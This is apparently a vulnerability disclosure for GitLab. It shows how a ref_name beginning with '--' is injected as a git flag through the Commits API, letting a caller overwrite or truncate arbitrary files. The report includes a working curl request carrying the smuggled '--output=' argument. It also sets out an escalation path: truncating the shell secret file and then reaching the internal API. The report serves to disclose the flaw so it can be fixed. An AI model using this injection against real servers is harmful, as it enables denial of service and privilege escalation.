### Summary
The `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.

If a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`

followed by

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`

This first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.

### Steps to reproduce

1. Create a repo and add a file
2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

3. See that the file has been created:

```
# ls -asl /tmp/written
0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
```

### Impact

The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.

One attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.

This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:

```
# gitlab-ctl restart unicorn
ok: run: unicorn: (pid 46755) 1s
root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
████████
``

This then allows for use of the internal api:
```
curl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'
{"api_version":"v4","gitlab_version":"12.0.3","gitlab_rev":"08a51a9db93","redis":true}

curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
{"id":1,"name":"Administrator","username":"root"}
```

### What is the current *bug* behavior?

The `ref_name` is not sanitized

### What is the expected *correct* behavior?

The `ref_name` should be sanitized to prevent it being used as git command flags.

## Impact

Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.
